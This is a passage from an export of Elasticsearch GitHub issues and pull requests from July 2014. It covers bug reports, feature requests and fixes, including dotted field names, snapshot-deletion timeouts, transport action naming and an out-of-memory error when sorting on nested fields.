}'

#Query for specific fields and note the incorrect values
curl -XGET 'http://localhost:9200/test/test/_search?q=val&amp;pretty&amp;fields=foo,foo.bar,foo.bat'
{
  "took" : 2,
  "timed_out" : false,
  "_shards" : {
    "total" : 5,
    "successful" : 5,
    "failed" : 0
  },
  "hits" : {
    "total" : 1,
    "max_score" : 0.15342641,
    "hits" : [ {
      "_index" : "test",
      "_type" : "test",
      "_id" : "1",
      "_score" : 0.15342641,
      "fields" : {
        "foo.bat" : [ "val" ],
        "foo.bar" : [ "val" ],
        "foo" : [ "val" ]
      }
    } ]
  }
}

#Same query with no fields specified
curl -XGET 'http://localhost:9200/test/test/_search?q=val&amp;pretty'
{
  "took" : 2,
  "timed_out" : false,
  "_shards" : {
    "total" : 5,
    "successful" : 5,
    "failed" : 0
  },
  "hits" : {
    "total" : 1,
    "max_score" : 0.15342641,
    "hits" : [ {
      "_index" : "test",
      "_type" : "test",
      "_id" : "1",
      "_score" : 0.15342641,
      "_source":
{
  "foo" : "val",
  "foo.bar" : "val_WILL_NOT_SHOW",
  "foo.bat" : "val_THIS_EITHER"
}
    } ]
  }
}
```
</description><key id="39216930">7112</key><summary>Incorrect field values returned when '.' (dot) used in property name</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">danielcweeks</reporter><labels /><created>2014-07-31T17:21:33Z</created><updated>2014-07-31T18:28:03Z</updated><resolved>2014-07-31T18:28:03Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-07-31T18:28:03Z" id="50799032">Hi @dcw-netflix 

Yes, we're planning on making dots in field names illegal for this reason: See #6736 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Marvel: Can we please show the following Node info ?</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7111</link><project id="" key="" /><description>Can we please see some hardware/OS info for the server a given node is running on?

Cpu: num cores/procs, arch, brand/model
OS: name, version, distro, etc

Its useful, when managing a number of different nodes running on different servers, to be able to see if a given node is running on an odd piece of hardware (usually the result of a linux VM mis-configuration)
</description><key id="39212575">7111</key><summary>Marvel: Can we please show the following Node info ?</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/pickypg/following{/other_user}', u'events_url': u'https://api.github.com/users/pickypg/events{/privacy}', u'organizations_url': u'https://api.github.com/users/pickypg/orgs', u'url': u'https://api.github.com/users/pickypg', u'gists_url': u'https://api.github.com/users/pickypg/gists{/gist_id}', u'html_url': u'https://github.com/pickypg', u'subscriptions_url': u'https://api.github.com/users/pickypg/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/1501235?v=4', u'repos_url': u'https://api.github.com/users/pickypg/repos', u'received_events_url': u'https://api.github.com/users/pickypg/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/pickypg/starred{/owner}{/repo}', u'site_admin': False, u'login': u'pickypg', u'type': u'User', u'id': 1501235, u'followers_url': u'https://api.github.com/users/pickypg/followers'}</assignee><reporter username="">nickminutello</reporter><labels><label>feature</label></labels><created>2014-07-31T16:32:33Z</created><updated>2016-11-30T20:40:37Z</updated><resolved>2016-11-25T18:26:02Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="bleskes" created="2014-11-07T09:51:15Z" id="62120459">@nickminutello thx for the suggestion! We do have some plans to visualize your cluster topology (nodes + roles + basic info) but we have made those concrete yet. I made a note of this is issue and we might be able to put something simpler in place first.
</comment><comment author="clintongormley" created="2015-11-21T16:39:00Z" id="158660975">@tlrx @simianhacker an idea from marvel 1
</comment><comment author="clintongormley" created="2016-11-25T18:26:01Z" id="263008159">This issue was moved to an internal repository.</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Transport: Introduced worker threads to prevent alien threads of entering a node.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7110</link><project id="" key="" /><description>Requests are handled by the worked thread pool of the target node instead of the generic thread pool of the source node.

Note this PR is for the improve_zen branch.
</description><key id="39203805">7110</key><summary>Transport: Introduced worker threads to prevent alien threads of entering a node.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">martijnvg</reporter><labels /><created>2014-07-31T15:09:15Z</created><updated>2015-05-18T23:30:40Z</updated><resolved>2014-07-31T21:08:24Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="kimchy" created="2014-07-31T20:58:53Z" id="50817743">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Cluster block with auto create index bulk action can cause bulk execution to not return</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7109</link><project id="" key="" /><description>...n to not return

when there is a cluster block (like no master yet discovered), the bulk action doesn't properly catch the exception of inner execute to notify the listener, causing the bulk operation to hang
closes #7086
</description><key id="39202717">7109</key><summary>Cluster block with auto create index bulk action can cause bulk execution to not return</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">kimchy</reporter><labels><label>:Bulk</label><label>bug</label><label>v1.3.2</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-07-31T14:58:38Z</created><updated>2015-06-07T19:13:26Z</updated><resolved>2014-07-31T15:15:39Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="martijnvg" created="2014-07-31T15:07:29Z" id="50771851">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Remove `numeric_range` filter</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7108</link><project id="" key="" /><description>As done with #4034, `numeric_range` filter has been deprecated since 1.0.0.

Removed in 2.0.0
</description><key id="39199343">7108</key><summary>Remove `numeric_range` filter</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dadoonet/following{/other_user}', u'events_url': u'https://api.github.com/users/dadoonet/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dadoonet/orgs', u'url': u'https://api.github.com/users/dadoonet', u'gists_url': u'https://api.github.com/users/dadoonet/gists{/gist_id}', u'html_url': u'https://github.com/dadoonet', u'subscriptions_url': u'https://api.github.com/users/dadoonet/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/274222?v=4', u'repos_url': u'https://api.github.com/users/dadoonet/repos', u'received_events_url': u'https://api.github.com/users/dadoonet/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dadoonet/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dadoonet', u'type': u'User', u'id': 274222, u'followers_url': u'https://api.github.com/users/dadoonet/followers'}</assignee><reporter username="">dadoonet</reporter><labels><label>:Query DSL</label><label>breaking</label><label>v2.0.0-beta1</label></labels><created>2014-07-31T14:25:52Z</created><updated>2015-06-06T16:43:35Z</updated><resolved>2014-08-13T08:39:26Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Mapping with java</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7107</link><project id="" key="" /><description>Hello ! 
I've a problem, I want to create a mapping with the Java API from a document JSON. 
It's possible to give a JSON and the API make the mapping ?
if anybody can help me I would be very grateful 
</description><key id="39191458">7107</key><summary>Mapping with java</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">MattouG</reporter><labels /><created>2014-07-31T12:56:09Z</created><updated>2014-07-31T13:26:07Z</updated><resolved>2014-07-31T13:18:44Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-07-31T13:18:44Z" id="50756999">Hi @MattouG 

Please ask questions like these on the mailing list. The github issues list is for bug reports and feature requests.
</comment><comment author="MattouG" created="2014-07-31T13:26:07Z" id="50757843">please where is the mailing list ?
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>deleting a snapshot throws FileNotFoundException</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7106</link><project id="" key="" /><description>es version: 1.2.1

when deleting one snapshot via [elasticsearch-py](https://github.com/elasticsearch/elasticsearch-py):
`es.snapshot.delete(repository=args.repository, snapshot=snapshot["snapshot"])`

it throws: 
`elasticsearch.exceptions.NotFoundError: TransportError(404, u'SnapshotMissingException[[es_backup_fast:2014-07-24_11:00:02] is missing]; nested: FileNotFoundException[/mnt/es_backup/fast_snapshot/snapshot-2014-07-24_11:00:02 (No such file or directory)]; ')`

i controlled the snapshot was there before via:
`es.snapshot.get(repository=args.repository, snapshot='_all')` and it was definitely there ...

Anyhow the snapshot is deleted properly. Any idea why a delete operation would throw an exception not finding what it deleted? I'm using [elasticsearch-py](https://github.com/elasticsearch/elasticsearch-py) Version 1.1.1

I'm building a es cluster object via:
`es = Elasticsearch(
    args.Hosts,
    sniff_on_start=True,
    sniff_on_connection_fail=True,
    sniffer_timeout=60
)
`
where args.Hosts are two es cluster nodes from one cluster.

thanks in advance
</description><key id="39186516">7106</key><summary>deleting a snapshot throws FileNotFoundException</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/imotov/following{/other_user}', u'events_url': u'https://api.github.com/users/imotov/events{/privacy}', u'organizations_url': u'https://api.github.com/users/imotov/orgs', u'url': u'https://api.github.com/users/imotov', u'gists_url': u'https://api.github.com/users/imotov/gists{/gist_id}', u'html_url': u'https://github.com/imotov', u'subscriptions_url': u'https://api.github.com/users/imotov/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/655851?v=4', u'repos_url': u'https://api.github.com/users/imotov/repos', u'received_events_url': u'https://api.github.com/users/imotov/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/imotov/starred{/owner}{/repo}', u'site_admin': False, u'login': u'imotov', u'type': u'User', u'id': 655851, u'followers_url': u'https://api.github.com/users/imotov/followers'}</assignee><reporter username="">l0bster</reporter><labels><label>bug</label></labels><created>2014-07-31T11:44:31Z</created><updated>2014-07-31T20:20:31Z</updated><resolved>2014-07-31T19:58:52Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="imotov" created="2014-07-31T13:24:38Z" id="50757677">@l0bster can you reproduce it?
</comment><comment author="l0bster" created="2014-07-31T14:19:54Z" id="50764727">here is a list of snapshots which should get deleted (marked with sDEL). This list was created with a dry run flag so nothing happened at all. This means the snapshots listed do exist:

+---------------------+---------+--------------+------+
|       Snapshot      |  Status | Runtime in s | Age  |
+---------------------+---------+--------------+------+
**| 2014-07-24_18:30:01 | SUCCESS |    59904     | sDEL |**
| 2014-07-24_19:30:02 | SUCCESS |      17      | sDEL |
| 2014-07-24_20:00:01 | SUCCESS |      26      | sDEL |

When i now try to delete the snapshot `2014-07-24_18:30:01`  ... boom:

/System/Library/Frameworks/Python.framework/Versions/2.7/bin/python /Users/PycharmProjects/esbackup/esbackup.py -r -H ptlxtme02 ptlxtme03 -R es_backup_fast --age 6d
Traceback (most recent call last):
  File "/Users/x/PycharmProjects/esbackup/esbackup.py", line 143, in &lt;module&gt;
    es.snapshot.delete(repository=args.repository, snapshot=snapshot["snapshot"])
  File "/Library/Python/2.7/site-packages/elasticsearch/client/utils.py", line 68, in _wrapped
    return func(_args, params=params, *_kwargs)
  File "/Library/Python/2.7/site-packages/elasticsearch/client/snapshot.py", line 34, in delete
    _make_path('_snapshot', repository, snapshot), params=params)
  File "/Library/Python/2.7/site-packages/elasticsearch/transport.py", line 276, in perform_request
    status, headers, data = connection.perform_request(method, url, params, body, ignore=ignore, timeout=timeout)
  File "/Library/Python/2.7/site-packages/elasticsearch/connection/http_urllib3.py", line 55, in perform_request
    self._raise_error(response.status, raw_data)
  File "/Library/Python/2.7/site-packages/elasticsearch/connection/base.py", line 97, in _raise_error
    raise HTTP_EXCEPTIONS.get(status_code, TransportError)(status_code, error_message, additional_info)
elasticsearch.exceptions.NotFoundError: TransportError(404, u'SnapshotMissingException[[es_backup_fast:2014-07-24_18:30:01] is missing]; nested: FileNotFoundException[/mnt/es_backup/fast_snapshot/snapshot-2014-07-24_18:30:01 (No such file or directory)]; ')

Process finished with exit code 1

After that when i repeat the dry run the snapshot is no longer listed since it got deleted properly (no longer registered an all file system entries in the snapshot repository are removed too):

+---------------------+---------+--------------+------+
|       Snapshot      |  Status | Runtime in s | Age  |
+---------------------+---------+--------------+------+
| 2014-07-24_19:30:02 | SUCCESS |      17      | sDEL |
| 2014-07-24_20:00:01 | SUCCESS |      26      | sDEL |
| 2014-07-24_20:30:02 | SUCCESS |      9       | sDEL |

so... yes i can reproduce it.
</comment><comment author="imotov" created="2014-07-31T14:25:58Z" id="50765581">@l0bster can you reproduce it using REST api (without python client)?
</comment><comment author="l0bster" created="2014-07-31T18:26:15Z" id="50798760">Hey,

using the REST api it seems to work without any problem:

curl -XDELETE "localhost:9200/_snapshot/es_backup_fast/2014-07-24_20:00:01"

Respone:
**{"acknowledged":true}**

so is this an elasticsearch-py problem?
</comment><comment author="HonzaKral" created="2014-07-31T19:04:40Z" id="50804004">Hi, there is something wrong here. Let's try to setup logging properly to see what's happening behind the scenes, could you add folowing code to your script and then attach the output here? Thanks!

```
import logging
# get trace logger and set level
tracer = logging.getLogger('elasticsearch.trace')
tracer.setLevel(logging.DEBUG)
# add handlers to logger and tracer
tracer.addHandler(logging.FileHandler('/tmp/eslog'))
```

it should create a file in /tmp/eslog that will contain a curl transcript of your session.
</comment><comment author="l0bster" created="2014-07-31T19:19:39Z" id="50805846">Hey there,

i put the log into a private gist: [eslog](https://gist.github.com/l0bster/a74e54038f29bff9be3b)
and changed ip addresses, hostnames and so on.

thanks in advance 
</comment><comment author="HonzaKral" created="2014-07-31T19:28:22Z" id="50806865">Hmm, nothing suspicious there, could I ask you to run it once more with

```
import logging

# get main logger and set level
logger = logging.getLogger('elasticsearch')
logger.setLevel(logging.DEBUG)

# create console handler
ch = logging.FileHandler('/tmp/eslog2')

# create formatter and add it to stderr
formatter = logging.Formatter(
    '%(asctime)s - %(name)s - %(levelname)s - %(message)s')
ch.setFormatter(formatter)
logger.addHandler(ch)
```

Thanks for the help!
</comment><comment author="l0bster" created="2014-07-31T19:55:46Z" id="50810066">i thank you :)

[here](https://gist.github.com/l0bster/75f8506b7e69ee07740a) you can find the second debug log. seems like the es cluster is not answering in time?
</comment><comment author="HonzaKral" created="2014-07-31T19:58:52Z" id="50810477">Oh yeah - the cluster doesn't respond in time so that the python client re-tries the command. Then on the second try the snapshot is no longer there so it correctly throws 404. The solution here is to have the timeout longer - either by passing in the timeout parameter to the client itself or by specifying request_timeout to the API call (available in the newest elasticsearch-py only).

Thanks for your help in debugging.
</comment><comment author="l0bster" created="2014-07-31T20:20:31Z" id="50812998">hey,

yep ... calling the client with timeout set to 60 seconds made it work... it seems he needs ca. 5 seconds for each snapshot, the old seems to be smaller then this.

however, thanks for your support!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Better categorization for transport actions</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7105</link><project id="" key="" /><description>Our transport relies on action names that tell what we need to do with each message received and sent on any node, together with the content of the request itself.
The action names could use a better categorization and more consistent naming though, the following are the categories introduced with this commit:
- `indices`: for all the apis that execute against indices
  - `admin`: for the apis that allow to perform administration tasks against indices
  - `data`: for the apis that are about data
    - `read`: apis that read data
    - `write`: apis that write data
    - `benchmark`: apis that run benchmarks
- `cluster`: for all the cluster apis
  - `admin`: for the cluster apis that allow to perform administration tasks
  - `monitor`: for the cluster apis that allow to monitor the system
- `internal`: for all the internal actions that are used from node to node but not directly exposed to users

The change is applied in a backwards compatible manner: we keep the mapping old-to-new action name around, and when receiving a message, depending on the version of the node we receive it from, we use the received action name or we convert it to the previous version (old to new if version &lt; 1.4). When sending a message, depending on the version of the node we talk to, we use the updated action or we convert it to the previous version (new to old if version &lt; 1.4).
For the cases where we don't know the version of the node we talk to, namely unicast ping, transport client nodes info and transport client sniff mode (which calls cluster state), we just use a lower bound for the version, thus we will always use the old action name, which can be understood by both old nodes and new nodes.

Added test that enforces known updated categories for transport action names and test that verifies all action names have a pre 1.4 version for bw compatibility

Added backwards compatibility tests for unicast and transport client in sniff mode, the one for the ordinary transport client (that call nodes info) is implicit as it's used all the time in our bw comp tests.
Added also backwards comp test that sends an empty message to any of the registered transport handler exposed by older nodes and verifies that what gets back is not `ActionNotFoundTransportException`, which would mean that there is a problem in the actions mappings.

Added `TestCluster#getClusterName` abstract method and allow to retrieve externalTransportAddress and internalCluster from `CompositeTestCluster`.
</description><key id="39181869">7105</key><summary>Better categorization for transport actions</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">javanna</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-07-31T10:30:26Z</created><updated>2015-06-07T12:32:04Z</updated><resolved>2014-08-04T13:25:31Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="javanna" created="2014-08-01T09:38:01Z" id="50866590">Pushed a new commit that addresses your feedback @uboness 
</comment><comment author="uboness" created="2014-08-01T12:04:10Z" id="50876754">LGTM.. would be good to have another pair of eyes on this one (@kimchy ?)
</comment><comment author="kimchy" created="2014-08-04T10:36:17Z" id="51044307">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>OS X: elasticsearch --argument hangs</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7104</link><project id="" key="" /><description>Hi,

There is an issue in https://github.com/elasticsearch/elasticsearch/blob/master/bin/elasticsearch script: on OS X `elasticsearch --version` and alike commands hang forever. The reason is [here](https://github.com/elasticsearch/elasticsearch/blob/521f8b28b5a5912debd07426aad10c19861e28ed/bin/elasticsearch#L158): with a single `--parameter` script runs `shift 2`, trying to take 2 arguments from input. In dash (Ubuntu) this reduces `$#` below zero and the loop stops, but on OS X sh keeps `$#` equal to 1 in this case, making the loop spin forever.
</description><key id="39181835">7104</key><summary>OS X: elasticsearch --argument hangs</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/spinscale/following{/other_user}', u'events_url': u'https://api.github.com/users/spinscale/events{/privacy}', u'organizations_url': u'https://api.github.com/users/spinscale/orgs', u'url': u'https://api.github.com/users/spinscale', u'gists_url': u'https://api.github.com/users/spinscale/gists{/gist_id}', u'html_url': u'https://github.com/spinscale', u'subscriptions_url': u'https://api.github.com/users/spinscale/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/667544?v=4', u'repos_url': u'https://api.github.com/users/spinscale/repos', u'received_events_url': u'https://api.github.com/users/spinscale/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/spinscale/starred{/owner}{/repo}', u'site_admin': False, u'login': u'spinscale', u'type': u'User', u'id': 667544, u'followers_url': u'https://api.github.com/users/spinscale/followers'}</assignee><reporter username="">kmike</reporter><labels><label>:Packaging</label></labels><created>2014-07-31T10:29:58Z</created><updated>2014-12-02T12:55:05Z</updated><resolved>2014-12-02T12:55:05Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="spinscale" created="2014-10-17T21:46:07Z" id="59580844">@kmike if you some spare cycles, maybe you could check if my change makes sense or if you have a better idea? Thanks a lot!
</comment><comment author="t-lo" created="2014-12-02T12:14:20Z" id="65222528">Ping @spinscale - this bug was fixed by #8729 (which has been merged)  :)
</comment><comment author="clintongormley" created="2014-12-02T12:55:05Z" id="65226499">many thanks @t-lo 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add "size" parameter to historgram aggregation (limit number of returned results)</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7103</link><project id="" key="" /><description>It would be very helpful to be able to limit the number of returned results for histogram and date histogram aggregations.

Example use case: collecting requests logs in Elasticsearch. You want to see the maximum req/sec rate over the last hour (or whatever time period). Using aggregations it's easy to use date histogram with a second interval, sort by doc count and get the top second with most requests. But as the time period you query over is bigger, the response size becomes huge (and if on top of that you have a parent bucket - like histogram per request type - it's even worse). It's very wasteful to get the entire histogram results which consumes a lot of network and high latency when all you need are the top couple of buckets. 
</description><key id="39176992">7103</key><summary>Add "size" parameter to historgram aggregation (limit number of returned results)</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/jpountz/following{/other_user}', u'events_url': u'https://api.github.com/users/jpountz/events{/privacy}', u'organizations_url': u'https://api.github.com/users/jpountz/orgs', u'url': u'https://api.github.com/users/jpountz', u'gists_url': u'https://api.github.com/users/jpountz/gists{/gist_id}', u'html_url': u'https://github.com/jpountz', u'subscriptions_url': u'https://api.github.com/users/jpountz/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/299848?v=4', u'repos_url': u'https://api.github.com/users/jpountz/repos', u'received_events_url': u'https://api.github.com/users/jpountz/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/jpountz/starred{/owner}{/repo}', u'site_admin': False, u'login': u'jpountz', u'type': u'User', u'id': 299848, u'followers_url': u'https://api.github.com/users/jpountz/followers'}</assignee><reporter username="">rore</reporter><labels><label>discuss</label></labels><created>2014-07-31T09:18:50Z</created><updated>2014-10-17T07:10:15Z</updated><resolved>2014-10-17T07:10:15Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-07-31T10:12:39Z" id="50740933">i think this would be handled by #2040, no?
</comment><comment author="colings86" created="2014-07-31T12:54:51Z" id="50754484">Would also be handled by #6704 
</comment><comment author="jpountz" created="2014-07-31T13:29:36Z" id="50758214">I am not sure the `histogram` aggregation should support a `size` parameter in the same way as `terms` do. This aggregation is already selective in the sense that the number of buckets is manageable through the interval (whereas for terms you depend on the cardinality of your fields). Moreover, this would expose `histograms` to the same accuracy challenges as `terms`. I think such a feature would be better addressed by adding the ability to perform some post-processing on top of the reduced aggregation?
</comment><comment author="clintongormley" created="2014-10-17T07:10:15Z" id="59474366">Closed in favour of #8110 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>OOM again</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7102</link><project id="" key="" /><description>here is my query,when I add sort on it ,so it can result in OOM
the query json:
{
  "sort" : [
       {
          "pt_float_props.value" : {
             "order" : "asc",
             "nested_filter" : {
                "term" : {  "pt_float_props.name": "consume_vol_tot" }
             }
          }
       },  {
          "pt_str_props.value" : {
             "order" : "asc",
             "nested_filter" : {
                "term" : {  "pt_str_props.name": "last_login_date" }
             }
          }
       }
    ],
  "query": {
    "filtered": {
      "query": {
        "match_all": {}
      },
      "filter": {
        "and": [
          {
            "nested": {
              "path": "pt_float_props",
              "filter": {
                "bool": {
                  "must": [
                    {
                      "term": {
                        "pt_float_props.name": "consume_vol_tot"
                      }
                    },
                    {
                      "range": {
                        "pt_float_props.value": {
                          "from": 10
                        }
                      }
                    }
                  ]
                }
              }
            }
          },
          {
            "nested": {
              "path": "pt_str_props",
              "filter": {
                "bool": {
                  "must": [
                    {
                      "term": {
                        "pt_str_props.name": "last_login_date"
                      }
                    },
                    {
                      "range": {
                        "pt_str_props.value": {"from" : "2012-02-22"}
                      }
                    }
                  ]
                }
              }
            }
          },
          {
            "nested": {
              "path": "pt_str_props",
              "filter": {
                "bool": {
                  "must": [
                    {
                      "term": {
                        "pt_str_props.name": "last_consume_date"
                      }
                    },
                    {
                      "range": {
                        "pt_str_props.value": {"from": "2011-02-22"}
                      }
                    }
                  ]
                }
              }
            }
          }
        ]
      }
    }
  }
}

the error
Caused by: java.lang.OutOfMemoryError: Java heap space
[2014-07-31 11:20:11,753][DEBUG][action.search.type       ] [Freakmaster] [test][50], node[-aNuC2p0SxyA91sJXn8L5A], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@f85ad37]
java.lang.OutOfMemoryError: Java heap space
[2014-07-31 11:20:03,413][DEBUG][action.search.type       ] [Freakmaster] [test][48], node[3nv09tjgTKSAkZnu8eaeJA], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@2fee46f5]
org.elasticsearch.transport.RemoteTransportException: [Balor][inet[/10.1.10.154:9300]][search/phase/query]
Caused by: org.elasticsearch.search.query.QueryPhaseExecutionException: [test][48]: query[filtered(ConstantScore(+QueryWrapperFilter(ToParentBlockJoinQuery (filtered(+pt_float_props.name:consume_vol_tot +pt_float_props.value:[240.0 TO *])-&gt;cache(_type:__pt_float_props))) +QueryWrapperFilter(ToParentBlockJoinQuery (filtered(+pt_str_props.name:last_login_date +pt_str_props.value:2014-02-22)-&gt;cache(_type:__pt_str_props))) +QueryWrapperFilter(ToParentBlockJoinQuery (filtered(+pt_str_props.name:pt_id +(pt_str_props.value:seven13577 pt_str_props.value:semail0018))-&gt;cache(_type:__pt_str_props)))))-&gt;cache(_type:pt_game_properties_all)],from[0],size[10],sort[&lt;custom:"pt_float_props.value": org.elasticsearch.index.search.nested.NestedFieldComparatorSource@549a1432&gt;!]: Query Failed [Failed to execute main query]
        at org.elasticsearch.search.query.QueryPhase.execute(QueryPhase.java:138)
        at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:239)
        at org.elasticsearch.search.action.SearchServiceTransportAction$SearchQueryTransportHandler.messageReceived(SearchServiceTransportAction.java:529)
        at org.elasticsearch.search.action.SearchServiceTransportAction$SearchQueryTransportHandler.messageReceived(SearchServiceTransportAction.java:518)
        at org.elasticsearch.transport.netty.MessageChannelHandler$RequestHandler.run(MessageChannelHandler.java:265)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
        at java.lang.Thread.run(Thread.java:619)
Caused by: org.elasticsearch.ElasticSearchException: java.lang.OutOfMemoryError: Java heap space
        at org.elasticsearch.index.fielddata.plain.DoubleArrayIndexFieldData.load(DoubleArrayIndexFieldData.java:80)
        at org.elasticsearch.index.fielddata.plain.DoubleArrayIndexFieldData.load(DoubleArrayIndexFieldData.java:46)
        at org.elasticsearch.index.fielddata.fieldcomparator.DoubleValuesComparatorBase.setNextReader(DoubleValuesComparatorBase.java:57)
        at org.elasticsearch.index.search.nested.NestedFieldComparator.setNextReader(NestedFieldComparatorSource.java:128)
        at org.apache.lucene.search.TopFieldCollector$OneComparatorNonScoringCollector.setNextReader(TopFieldCollector.java:97)
        at org.apache.lucene.search.IndexSearcher.search(IndexSearcher.java:603)
        at org.elasticsearch.search.internal.ContextIndexSearcher.search(ContextIndexSearcher.java:161)
        at org.apache.lucene.search.IndexSearcher.search(IndexSearcher.java:572)
        at org.apache.lucene.search.IndexSearcher.search(IndexSearcher.java:524)
        at org.apache.lucene.search.IndexSearcher.search(IndexSearcher.java:501)
        at org.apache.lucene.search.IndexSearcher.search(IndexSearcher.java:345)
        at org.elasticsearch.search.query.QueryPhase.execute(QueryPhase.java:127)
        ... 7 more
Caused by: org.elasticsearch.common.util.concurrent.ExecutionError: java.lang.OutOfMemoryError: Java heap space
        at org.elasticsearch.common.cache.LocalCache$Segment.get(LocalCache.java:2261)
        at org.elasticsearch.common.cache.LocalCache.get(LocalCache.java:4000)
        at org.elasticsearch.common.cache.LocalCache$LocalManualCache.get(LocalCache.java:4789)
        at org.elasticsearch.indices.fielddata.cache.IndicesFieldDataCache$IndexFieldCache.load(IndicesFieldDataCache.java:144)
        at org.elasticsearch.index.fielddata.plain.DoubleArrayIndexFieldData.load(DoubleArrayIndexFieldData.java:75)
        ... 18 more
Caused by: java.lang.OutOfMemoryError: Java heap space
